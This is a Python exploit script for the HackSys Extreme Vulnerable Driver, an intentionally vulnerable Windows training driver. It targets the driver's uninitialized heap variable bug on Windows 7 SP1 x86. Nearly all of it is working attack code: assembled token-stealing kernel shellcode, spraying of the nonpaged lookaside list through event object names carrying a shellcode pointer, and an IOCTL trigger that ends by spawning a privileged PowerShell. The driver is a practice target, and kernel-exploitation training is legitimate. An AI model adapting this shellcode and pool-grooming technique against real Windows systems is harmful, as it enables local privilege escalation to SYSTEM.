#!/usr/bin/python
#
# HEVD v1.20 UninitializedHeapVariable exploit for Windows 7 SP1 x86 by @acru3l.
#

import sys
import struct
from ctypes import *

device_name = r'\\.\HackSysExtremeVulnerableDriver'

# assembled with WinDBG
shellcode = ''
shellcode += '\x60'                             # pushad
shellcode += '\x31\xc0'                         # xor     eax,eax
shellcode += '\x64\x8b\x80\x24\x01\x00\x00'     # mov     eax,dword ptr fs:[eax+124h] ; 0x124 = offset nt!_KPCR.PcrbData.CurrentThread
shellcode += '\x8b\x40\x50'                     # mov     eax,dword ptr [eax+50h]     ; 0x50 = offset nt!_KTHREAD.ApcState.Process
shellcode += '\x8b\xc8'                         # mov     ecx,eax
shellcode += '\xba\x04\x00\x00\x00'             # mov     edx,4
shellcode += '\x8b\x80\xb8\x00\x00\x00'         # mov     eax,dword ptr [eax+0B8h]    ; 0xB8 = offset nt!_EPROCESS.ActiveProcessLinks.Flink
shellcode += '\x2d\xb8\x00\x00\x00'             # sub     eax,0B8h
shellcode += '\x39\x90\xb4\x00\x00\x00'         # cmp     dword ptr [eax+0B4h],edx    ; 0xB4 = offset nt!_EPROCESS.UniqueProcessId
shellcode += '\x75\xed'                         # jne     $-17
shellcode += '\x8b\x90\xf8\x00\x00\x00'         # mov     edx,dword ptr [eax+0F8h]    ; 0xF8 = offset nt!_EPROCESS.Token
shellcode += '\x89\x91\xf8\x00\x00\x00'         # mov     dword ptr [ecx+0F8h],edx
shellcode += '\x61'                             # popad
shellcode += '\xc3'                             # ret

def rand_str(n):
    import random
    charset = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
    res = []
    for i in xrange(n):
        res.append(random.choice(charset))
    
    return ''.join(res)

hFile = windll.kernel32.CreateFileA(device_name,
                                0xC0000000,     # GENERIC_READ | GENERIC_WRITE
                                0x00000001,     # FILE_SHARE_READ
                                0,              # NULL
                                3,              # OPEN_EXISTING
                                0x80,           # FILE_ATTRIBUTE_NORMAL
                                0)              # NULL

if hFile == -1:
    print '[-] Failed to open device: %s' % device_name
    sys.exit(1)
print '[+] Device opened successfully: %s' % device_name

shellcode_buffer = windll.kernel32.VirtualAlloc(0,
                                len(shellcode) + 1,
                                0x00003000,     # MEM_COMMIT | MEM_RESERVE
                                0x40)           # PAGE_EXECUTE_READWRITE

if shellcode_buffer == 0:
    print '[-] Failed to allocate shellcode'
    sys.exit(1)
if shellcode_buffer & 0xFFFF == 0:
    # make sure it won't terminate event name...
    shellcode_buffer += 1
print '[+] Shellcode allocated at 0x%08x' % shellcode_buffer

memmove(shellcode_buffer, shellcode, len(shellcode))

# kd> !poolinfo -b f8 -l -t nonpaged 82b4ac40
# Lookaside[1E]: size=0F8, 82b4b4b0
#   99d3f588: size:0F8 prev:030 index:02 type:05 tag:FMfn
#   99d08f08: size:0F8 prev:030 index:03 type:05 tag:NtFA
# kd>

print '[+] Consuming Lookaside bucket'
objects = []
for i in xrange(0x100):
    payload = 'AAAA' + struct.pack('<L', shellcode_buffer) + rand_str(0xe6) + '\x00' * 2
    payload_buff = create_string_buffer(payload)
    hObj = windll.kernel32.CreateEventW(0,
                                    0,
                                    0,
                                    payload_buff)
    objects.append(hObj)

# kd> !poolinfo -b f8 -l -t nonpaged 82b4ac40
# Lookaside[1E]: size=0F8, 82b4b4b0
#   99d3f588: size:0F8 prev:030 index:02 type:05 tag:ObNm
# kd>

print '[+] Freeing Lookaside bucket'
for h in objects:
    windll.kernel32.CloseHandle(h)

# kd> !poolinfo -b f8 -l -t nonpaged 82b4ac40
# Lookaside[1E]: size=0F8, 82b4b4b0
#   99d31d30: size:0F8 prev:080 index:03 type:05 tag:ObNm
#   8d8f45e0: size:0F8 prev:028 index:01 type:05 tag:ObNm
#   99d08f08: size:0F8 prev:030 index:03 type:05 tag:ObNm
#   99d3f588: size:0F8 prev:030 index:02 type:05 tag:ObNm
# kd>

print '[+] Triggering reuse of dirty chunk'

ioctl_code = 0x222033    # call UninitializedHeapVariableIoctlHandler
windll.kernel32.DeviceIoControl(hFile,
                                ioctl_code,
                                struct.pack('<L', 0xcafebabe),
                                4,
                                0,
                                0,
                                byref(c_int(0)),
                                0)

# Got SYSTEM shell?
import os
os.system("powershell.exe")
